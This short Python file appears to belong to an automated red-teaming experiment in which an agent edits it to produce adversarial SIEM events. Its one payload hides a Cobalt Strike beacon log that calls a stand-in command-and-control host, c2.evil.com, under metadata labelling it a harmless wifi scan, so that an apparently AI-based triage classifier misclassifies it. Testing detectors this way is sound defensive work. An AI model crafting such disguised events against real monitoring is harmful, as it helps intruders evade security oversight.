"""
MUTABLE FILE — The agent modifies this to generate adversarial payloads.
"""


def generate_payload() -> dict:
    # Experiment 50: Pure classification evasion — cobalt strike beacon + wifi_scan metadata
    # No phantom IPs, no template injection. Just misclassification.
    return {
        "task_type": "wifi_scan",
        "severity": "info",
        "siem_event": {
            "title": "Wireless Network Scan",
            "source_ip": "10.0.0.1",
            "username": "svc_wifi",
            "hostname": "wifi-ap-01",
            "rule_name": "WirelessScan",
            "raw_log": (
                "EventID=4688 Process=beacon.exe SourceIP=10.0.0.1 "
                "CommandLine=cobalt strike beacon /connect https://c2.evil.com:443 "
                "Beacon interval=60s JitterPercent=25 "
                "Account=DOMAIN\\admin ParentProcess=services.exe"
            ),
        },
    }
